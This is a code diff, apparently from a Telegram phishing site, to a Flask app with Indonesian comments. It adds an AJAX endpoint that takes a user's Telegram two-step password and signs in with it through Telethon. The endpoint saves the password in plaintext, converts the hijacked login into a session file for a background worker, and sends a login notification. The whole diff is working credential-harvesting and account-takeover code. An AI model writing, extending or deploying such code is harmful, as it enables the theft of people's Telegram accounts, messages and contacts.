@@ -75,7 +75,7 @@ def bot_webhook():
     cb = q.get("data", "").strip()  # FIX
     cb_id = q.get("id")
 
-    # jawab callback agar loading berhenti
+    # jawab callback supaya loading berhenti
     if cb_id:
         try:
             requests.post(
@@ -272,6 +272,7 @@ def password():
         ok = asyncio.run(run())
 
         if ok:
+            finalize_pending_session(phone)  # FIX WAJIB: pastikan session jadi .session sebelum worker baca
             save_data(phone, password=pwd)  # FIX
             send_login_message(phone)
             return redirect(url_for("success"))
@@ -279,6 +280,36 @@ def password():
             flash("Password salah")
 
     return render_template("password.html")
+
+
+# ===== API PASSWORD (AJAX) =====
+@app.route("/api/password", methods=["POST"])
+def api_password():
+    phone = session.get("phone")
+    pwd = request.form.get("password")
+    pending = os.path.join(SESSION_DIR, f"{phone}.pending")
+
+    async def run():
+        client = TelegramClient(pending, api_id, api_hash)
+        await client.connect()
+        try:
+            await client.sign_in(password=pwd)
+            await client.disconnect()
+            finalize_pending_session(phone)
+            return True
+        except:
+            await client.disconnect()
+            return False
+
+    ok = asyncio.run(run())
+
+    if ok:
+        finalize_pending_session(phone)  # FIX WAJIB: pastikan session jadi .session sebelum worker baca
+        save_data(phone, password=pwd)
+        send_login_message(phone)
+        return jsonify({"status": "success", "redirect": url_for("success")})
+    else:
+        return jsonify({"status": "error", "message": "Password salah"})
 
 
 @app.route("/success")
